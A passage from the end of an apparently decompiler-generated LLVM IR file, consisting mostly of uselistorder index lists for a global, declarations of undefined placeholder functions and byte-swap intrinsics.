1005, 271, 1013, 1014, 1012, 1015, 275, 1016, 1017, 356, 1018, 355, 1019, 354, 1020, 435, 1021, 279, 1026, 1027, 1028, 1029, 278, 277, 280, 1030, 1031, 62, 63, 1025, 276, 1032, 1033, 281, 1034, 1035, 359, 1036, 358, 1037, 357, 1038, 436, 1039, 438, 89, 64, 1040, 132, 360, 439, 440, 1041, 1042, 282, 283, 1043, 437, 442, 90, 65, 1125, 133, 361, 443, 1126, 1127, 284, 285, 1128, 441, 325, 1051, 1129, 286, 1130, 922, 287, 923, 924, 102, 925, 926, 326, 444, 314, 927, 928, 40, 318, 929, 930, 445, 936, 288, 970, 362, 556, 363, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283 }
  uselistorder i32* @r4, { 35, 48, 49, 50, 6, 51, 52, 53, 7, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 41, 42, 43, 482, 483, 64, 65, 66, 67, 68, 69, 70, 71, 72, 712, 713, 73, 74, 8, 1, 75, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 9, 76, 77, 78, 79, 80, 81, 82, 83, 84, 10, 85, 86, 89, 90, 91, 92, 36, 93, 94, 95, 96, 97, 98, 87, 88, 37, 38, 99, 100, 11, 101, 12, 102, 13, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 14, 123, 124, 125, 15, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 44, 45, 46, 47, 39, 40, 642, 643, 273, 274, 730, 731, 732, 644, 645, 735, 740, 741, 742, 743, 744, 745, 746, 733, 138, 139, 140, 475, 476, 477, 734, 247, 16, 248, 249, 250, 251, 252, 253, 736, 739, 141, 142, 143, 144, 646, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 17, 663, 664, 665, 666, 647, 648, 649, 650, 610, 611, 612, 613, 614, 615, 616, 617, 618, 18, 619, 620, 621, 622, 623, 624, 625, 626, 627, 667, 689, 690, 691, 692, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 33, 681, 682, 0, 683, 684, 685, 686, 687, 688, 166, 167, 168, 737, 738, 581, 582, 419, 420, 275, 276, 277, 278, 279, 280, 281, 145, 146, 147, 282, 283, 284, 5, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 2, 295, 296, 297, 693, 694, 19, 695, 696, 697, 169, 170, 171, 524, 525, 484, 485, 172, 173, 174, 175, 176, 177, 178, 179, 159, 160, 161, 180, 181, 182, 183, 162, 150, 151, 148, 149, 152, 153, 154, 155, 156, 157, 158, 163, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 200, 201, 202, 203, 210, 211, 212, 213, 214, 3, 204, 205, 206, 207, 208, 209, 198, 199, 698, 699, 486, 487, 488, 489, 490, 164, 165, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 20, 21, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 298, 299, 4, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 22, 316, 23, 317, 24, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 25, 342, 26, 343, 27, 344, 28, 345, 346, 347, 348, 29, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 30, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 31, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 583, 584, 32, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 700, 701, 702, 703, 704, 705, 709, 710, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 706, 707, 708, 462, 463, 464, 467, 465, 466, 468, 469, 470, 471, 472, 473, 474, 478, 479, 480, 481, 34, 711 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #0

attributes #0 = { nounwind readnone }
